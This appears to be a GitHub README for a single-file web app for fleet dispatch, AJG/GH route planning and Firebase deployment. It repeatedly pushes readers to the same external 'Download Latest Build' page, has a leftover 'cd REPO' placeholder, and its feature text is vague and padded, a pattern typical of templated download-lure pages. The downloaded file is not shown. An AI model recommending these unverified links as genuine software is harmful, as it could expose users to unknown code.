# Asset Ops Master Dispatch v2 - Fleet Dispatch and Route Optimization 2026

> **Asset Ops Master Dispatch is a browser-based fleet operations application for managing dispatch tasks, improving AJG and GH route planning, and coordinating drivers through a version 2 weekly dispatch process.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/matteaxross2092/master-dispatch-route-ops?style=flat-square)](https://github.com/matteaxross2092/master-dispatch-route-ops)

---

<p align="center">
  <a href="https://matteaxross2092.github.io/master-dispatch-route-ops/">
    <img src="https://img.shields.io/badge/Download-Asset%20Ops%20Master%20Dispatch%20Latest-brightgreen?style=for-the-badge" alt="Download Asset Ops Master Dispatch">
  </a>
</p>

> **[Download Asset Ops Master Dispatch v2](https://matteaxross2092.github.io/master-dispatch-route-ops/)**

---

[Download Latest Build](https://matteaxross2092.github.io/master-dispatch-route-ops/)

---

## Product Overview

Asset Ops Master Dispatch provides one web workspace for fleet coordination and route preparation. Operations teams can plan AJG and GH routes, maintain a weekly dispatch board, organize assignments, inspect route details, and keep drivers aligned with current dispatch work.

The tool extends the dispatch process with Sales Hub connectivity and access to USPS route matrix information. Because it is delivered as a single-file web application, it can be hosted and shared with minimal setup. Teams may also use Firebase Hosting when they prefer a managed web deployment.

---

## Core Capabilities

- Plan and optimize AJG and GH routes for dispatch operations.
- Arrange work and assignments on a weekly dispatch board.
- Manage fleet activity and driver dispatch information.
- Tie dispatch processes to Sales Hub.
- Use USPS route matrix data during route planning.
- Support asset operations and centralized dispatch workflows.
- Operate as a single-file web application.
- Publish the application with Firebase Hosting.

---

## Getting Started

### Download for local use

1. Get the current build from the [release page](https://matteaxross2092.github.io/master-dispatch-route-ops/).
2. Save the application file inside a local project directory.
3. Launch the HTML file with a modern web browser.

### Work from a repository clone

```bash
git clone https://github.com/matteaxross2092/master-dispatch-route-ops.git
cd REPO
```

After cloning, open the main HTML file in a browser. If required by your browser or integration environment, run the directory through a local web server instead.

### Publish with Firebase Hosting

Use the Firebase CLI to set up and deploy the hosted application:

```bash
firebase login
firebase init hosting
firebase deploy
```

When Firebase asks for the hosting directory, choose the folder that contains the application file.

---

## Dispatch Workflow

A standard operating sequence may look like this:

1. Launch Asset Ops Master Dispatch in a supported browser.
2. Enter or verify the active fleet and driver assignments.
3. Choose the appropriate AJG or GH route planning process.
4. Arrange route work with the optimizer and USPS route matrix information.
5. Check the resulting assignments on the weekly dispatch board.
6. Handle associated Sales Hub work when applicable.
7. Publish or distribute the active deployment to the operations team.

The application is intended for repeatable dispatch planning, route evaluation, and fleet coordination within a single web interface.

---

## Configuration and Deployment Settings

Asset Ops Master Dispatch is packaged as a single-file web application. Maintain application options and integration values in the applicable configuration section of the HTML file, or in the hosting configuration used for deployment.

Before deploying with Firebase Hosting, inspect the generated Firebase files and confirm the selected hosting directory:

```text
firebase.json
.firebaserc
<hosting-directory>/
```

Deployment-specific service information, route data, and integration settings should match the environment in which the application is running.

---

## Requirements

- A current web browser.
- Web access to the deployed application when Firebase Hosting is used.
- A browser with HTML support for local execution.
- The Firebase CLI and a Firebase project for Firebase Hosting deployment.
- Sales Hub access details when that integration is enabled.
- Up-to-date fleet, driver, and route data for dispatch planning.
- Enough storage for the application file and any operational data maintained locally.

---

## Frequently Asked Questions

### What teams can use Asset Ops Master Dispatch?

The application is intended for groups responsible for asset operations, fleet administration, route planning, and driver dispatch coordination.

### Where can I find the newest build?

Open [Download Latest Build](https://matteaxross2092.github.io/master-dispatch-route-ops/) to reach the currently published version.

### Is Firebase required to use the application?

No. Since the tool is a single-file web application, it can be opened locally in a compatible browser. Firebase Hosting is an optional way to deploy it and is not needed for local execution.

### Where should configuration values be changed?

Check the application HTML along with the hosting configuration files. Values for integrations and deployment may require changes based on the target operating environment.

### What can I do if the application fails to open?

Verify that the downloaded file completed successfully, then try opening it in a current browser. Also confirm that required hosting and integration settings are available. For Firebase deployments, validate the chosen hosting directory and run `firebase deploy` again.

### How are new versions installed?

New builds are made available through the project’s latest build location. Download the updated file and replace the existing application, or redeploy the directory containing the newer build.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
